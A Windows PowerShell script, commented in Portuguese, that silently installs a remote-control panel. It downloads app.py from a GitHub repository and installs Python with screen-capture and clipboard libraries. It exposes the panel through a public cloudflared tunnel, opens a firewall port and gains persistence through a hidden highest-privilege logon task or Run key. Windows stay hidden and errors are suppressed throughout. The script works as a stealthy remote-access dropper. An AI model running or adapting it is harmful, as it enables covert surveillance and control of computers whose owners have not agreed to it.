$ErrorActionPreference = "SilentlyContinue"
$folder = "$env:USERPROFILE\testemipo"

# Se ja existe, so garante que rodando
if (Test-Path "$folder\app.py") {
    $proc = Get-Process pythonw -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*app.py*" }
    if (-not $proc) {
        Start-Process pythonw -ArgumentList "-B `"$folder\app.py`"" -WindowStyle Hidden
    }
    # Garante que cloudflared ta rodando
    $cfProc = Get-Process cloudflared -ErrorAction SilentlyContinue
    if (-not $cfProc) {
        Start-Process -FilePath "$folder\cloudflared.exe" -ArgumentList "tunnel --url http://localhost:5000" -WindowStyle Hidden
    }
    exit
}

# ── CRIAR PASTA ──
New-Item -ItemType Directory -Path $folder -Force | Out-Null

# ── BAIXAR ARQUIVOS ──
$githubUser = "nohanvs"
$repo = "nohanpcs"
$baseUrl = "https://raw.githubusercontent.com/$githubUser/$repo/main"

Invoke-WebRequest -Uri "$baseUrl/app.py" -OutFile "$folder\app.py" -UseBasicParsing

# ── CONFIGURAR HUB ──
$hubIp = "100.66.137.49"
$content = Get-Content "$folder\app.py" -Raw
$content = $content -replace 'HUB_URL = ".*?"', "HUB_URL = `"http://${hubIp}:8000`""
Set-Content -Path "$folder\app.py" -Value $content -Encoding UTF8

# ── INSTALAR PYTHON (INVISIVEL) ──
$hasPython = $false
try {
    $ver = & python --version 2>&1
    if ($ver -match "Python 3") { $hasPython = $true }
} catch {}

if (-not $hasPython) {
    try {
        winget install Python.Python.3.12 --silent --accept-source-agreements --accept-package-agreements 2>$null
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    } catch {
        $url = "https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe"
        $installer = "$env:TEMP\python-installer.exe"
        Invoke-WebRequest -Uri $url -OutFile $installer -UseBasicParsing
        Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait -NoNewWindow
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    }
}

# ── INSTALAR DEPENDENCIAS ──
& python -m pip install flask psutil requests mss pyperclip --quiet 2>$null

# ── BAIXAR CLOUDFLARED (TUNNEL GRATUITO) ──
$cfUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
Invoke-WebRequest -Uri $cfUrl -OutFile "$folder\cloudflared.exe" -UseBasicParsing

# ── CONFIGURAR REDE COMO PRIVADA ──
Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private -ErrorAction SilentlyContinue

# ── ADICIONAR REGRAS FIREWALL ──
try {
    New-NetFirewallRule -DisplayName "RemotePanel" -Direction Inbound -Protocol TCP -LocalPort 5000 -Action Allow -Profile Private -ErrorAction SilentlyContinue | Out-Null
} catch {}

# ── AUTO-START INVISIVEL (TAREFA AGENDADA) ──
$taskName = "RemotePanelSvc"
try {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
} catch {}

$action = New-ScheduledTaskAction -Execute "pythonw.exe" -Argument "-B `"$folder\app.py`"" -WorkingDirectory $folder
$trigger = New-ScheduledTaskTrigger -AtLogon
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -MultipleInstances IgnoreNew
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive

try {
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
} catch {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RemotePanel" -Value "pythonw -B `"$folder\app.py`""
}

# ── INICIAR PAINEL (INVISIVEL) ──
Start-Process pythonw -ArgumentList "-B `"$folder\app.py`"" -WindowStyle Hidden

# ── INICIAR CLOUDFLARED (TUNNEL PUBLICO) ──
Start-Process -FilePath "$folder\cloudflared.exe" -ArgumentList "tunnel --url http://localhost:5000" -WindowStyle Hidden

Start-Sleep 5

# ── NOTIFICAR DISCORD ──
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
try { $localIp = (Invoke-RestMethod -Uri "http://ifconfig.me" -TimeoutSec 5) } catch { $localIp = "N/A" }

Write-Host "Painel instalado: $username@$hostname"
Write-Host "Acesse pelo hub: http://${hubIp}:8000"
Start-Sleep 2
Stop-Process -Id $PID -Force
